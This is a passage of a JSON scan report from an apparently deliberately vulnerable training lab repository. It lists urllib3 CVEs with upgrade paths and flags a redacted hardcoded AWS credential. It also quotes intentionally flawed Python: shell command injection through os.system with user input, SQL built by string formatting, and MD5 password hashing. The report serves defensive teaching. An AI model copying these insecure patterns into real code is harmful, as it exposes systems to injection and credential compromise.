            "text": "Package: urllib3@1.24.1 (direct)\nVulnerability CVE-2023-45803 (severity: medium, fixed in 1.26.18)\nSmartFix: 1.26.19 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-45803](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45803)\nSample path: requirements.txt -\u003e urllib3@1.24.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/urllib3@1.24.1\n  1.24.1 is vulnerable:\n    high       CVE-2019-11324       FixVersion= 1.24.2\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2019-11236       FixVersion= 1.24.3\n    medium     CVE-2018-25091       FixVersion= 1.24.2\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.2 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.3 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.25.9 is vulnerable:\n    high       CVE-2021-33503       FixVersion= 1.26.5\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.5 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.17 is vulnerable:\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.18 is vulnerable:\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.19 is not vulnerable\n\nFix recommendations for package pkg:pypi/urllib3@1.24.1\n  1.26.19 is the minimal version with no known vulnerabilities\n  1.26.19 is the maximum version and it has no known vulnerabilities\n  1.26.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 8 versions (nodes) and 25 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 6,
                  "endLine": 6
                }
              },
              "message": {
                "text": "requirements.txt: urllib3@1.24.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "198008f8ef9ba0329032ad245dcb99fdaf32f305"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2024-37891",
          "ruleIndex": 459,
          "level": "warning",
          "message": {
            "text": "Package: urllib3@1.24.1 (direct)\nVulnerability CVE-2024-37891 (severity: medium, fixed in 1.26.19)\nSmartFix: 1.26.19 (Minimal version with no known vulnerabilities)\nLink: [CVE-2024-37891](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37891)\nSample path: requirements.txt -\u003e urllib3@1.24.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/urllib3@1.24.1\n  1.24.1 is vulnerable:\n    high       CVE-2019-11324       FixVersion= 1.24.2\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2019-11236       FixVersion= 1.24.3\n    medium     CVE-2018-25091       FixVersion= 1.24.2\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.2 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.3 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.25.9 is vulnerable:\n    high       CVE-2021-33503       FixVersion= 1.26.5\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.5 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.17 is vulnerable:\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.18 is vulnerable:\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.19 is not vulnerable\n\nFix recommendations for package pkg:pypi/urllib3@1.24.1\n  1.26.19 is the minimal version with no known vulnerabilities\n  1.26.19 is the maximum version and it has no known vulnerabilities\n  1.26.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 8 versions (nodes) and 25 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 6,
                  "endLine": 6
                }
              },
              "message": {
                "text": "requirements.txt: urllib3@1.24.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "33b58a0892234173b9adedaa0217bb21f5da1cb6"
          }
        },
        {
          "properties": {
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            },
            "severity": "critical"
          },
          "ruleId": "aws-string-credentials",
          "ruleIndex": 460,
          "level": "error",
          "message": {
            "text": "Potential secret found inside code. This could be a security risk."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "config.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 1,
                  "endLine": 1,
                  "endColumn": 1,
                  "snippet": {
                    "text": "Potential hardcoded credentials. The code snippet will not be displayed for security reasons."
                  }
                }
              },
              "message": {
                "text": "config.py: requirements.txt"
              },
              "properties": {
                "lastEdit": {
                  "time": "2025-05-01T22:20:01-06:00",
                  "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
                  "author": {
                    "name": "AJLab-GH",
                    "email": "ajammes.ftnt@gmail.com"
                  },
                  "committer": {
                    "name": "AJLab-GH",
                    "email": "ajammes.ftnt@gmail.com"
                  }
                }
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "71D155A1DC4C79F8"
          }
        },
        {
          "properties": {
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            },
            "severity": "high"
          },
          "ruleId": "string-concat-in-shell-command-python",
          "ruleIndex": 461,
          "level": "error",
          "message": {
            "text": "Detected string concatenation in shell command, which is a bad practice and may allow code injection attacks"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "vuln_app.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 5,
                  "endLine": 9,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\n# ❌ Command injection\ndef list_files(user_input):\n    os.system(f\"ls {user_input}\")\n\n# ❌ SQL Injection\ndef get_user(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()"
                  }
                }
              },
              "message": {
                "text": "vuln_app.py: requirements.txt"
              },
              "properties": {
                "lastEdit": {
                  "time": "2025-05-15T13:09:52-06:00",
                  "revision": "be233c959cd0b758893c38c22a7651fafac8b1b2",
                  "author": {
                    "name": "AJLab-GH",
                    "email": "ajammes.ftnt@gmail.com"
                  },
                  "committer": {
                    "name": "AJLab-GH",
                    "email": "ajammes.ftnt@gmail.com"
                  }
                }
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5CE4212CC9916095"
          },
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "artifactLocation": {
                            "uri": "vuln_app.py",
                            "uriBaseId": "%SRCROOT%"
                          },
                          "region": {
                            "startLine": 9,
                            "startColumn": 15,
                            "endLine": 9,
                            "endColumn": 33
                          }
                        },
                        "message": {
                          "text": "vuln_app.py: requirements.txt"
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "artifactLocation": {
                            "uri": "vuln_app.py",
                            "uriBaseId": "%SRCROOT%"
                          },
                          "region": {
                            "startLine": 9,
                            "startColumn": 5,
                            "endLine": 9,
                            "endColumn": 34
                          }
                        },
                        "message": {
                          "text": "vuln_app.py: requirements.txt"
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ]
        },
        {
          "properties": {
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            },
            "severity": "high"
          },
          "ruleId": "string-concat-in-sql-command-in-sqlite3-python",
          "ruleIndex": 462,
          "level": "error",
          "message": {
            "text": "Detected string concatenation in SQL command, which is a bad practice and may allow SQL injection attacks"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "vuln_app.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 5,
                  "endLine": 15,
                  "endColumn": 5,
                  "snippet": {
                    "text": "def get_user(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT * FROM users WHERE name = '%s'\" % username)\n    return cursor.fetchall()\n\n# ❌ Weak cryptography\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()"
                  }
                }
              },
              "message": {
                "text": "vuln_app.py: requirements.txt"
              },
              "properties": {
                "lastEdit": {
                  "time": "2025-05-15T13:09:52-06:00",
                  "revision": "be233c959cd0b758893c38c22a7651fafac8b1b2",
                  "author": {
                    "name": "AJLab-GH",
                    "email": "ajammes.ftnt@gmail.com"
                  },
                  "committer": {
                    "name": "AJLab-GH",
                    "email": "ajammes.ftnt@gmail.com"
                  }
                }
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9178F34F4E9D2A73"
          },
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "artifactLocation": {
                            "uri": "vuln_app.py",
                            "uriBaseId": "%SRCROOT%"
                          },
                          "region": {
                            "startLine": 15,
                            "startColumn": 20,
                            "endLine": 15,
                            "endColumn": 70
                          }
                        },
                        "message": {
                          "text": "vuln_app.py: requirements.txt"
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "artifactLocation": {
                            "uri": "vuln_app.py",
                            "uriBaseId": "%SRCROOT%"
                          },
                          "region": {
                            "startLine": 15,
                            "startColumn": 5,
                            "endLine": 15,
                            "endColumn": 71
                          }
                        },
                        "message": {
                          "text": "vuln_app.py: requirements.txt"
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ]
        },
        {
          "properties": {
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            },
            "severity": "medium"
          },
          "ruleId": "insecure-md5-in-hashlib-python",
          "ruleIndex": 463,
          "level": "warning",
          "message": {
            "text": "Detected use of weak MD5 hash function, which should be avoided when there are security implications"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "vuln_app.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 12,
                  "endLine": 20,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n# ❌ Weak cryptography\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()\n\nif __name__ == \"__main__\":\n    print(\"Token:\", generate_token())"
                  }
                }
              },
              "message": {
                "text": "vuln_app.py: requirements.txt"
              },
              "properties": {
                "lastEdit": {
                  "time": "2025-05-15T13:09:52-06:00",
                  "revision": "be233c959cd0b758893c38c22a7651fafac8b1b2",
                  "author": {
                    "name": "AJLab-GH",
                    "email": "ajammes.ftnt@gmail.com"
                  },
                  "committer": {
                    "name": "AJLab-GH",
                    "email": "ajammes.ftnt@gmail.com"
                  }
                }
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2DFE001F2D7D6D3B"
          }
        }
      ],
      "originalUriBaseIds": {
        "%SRCROOT%": {
          "uri": "file:///workspaces/github/lab_forticnapp_code_security/app"
        }
      }
    }
  ]
}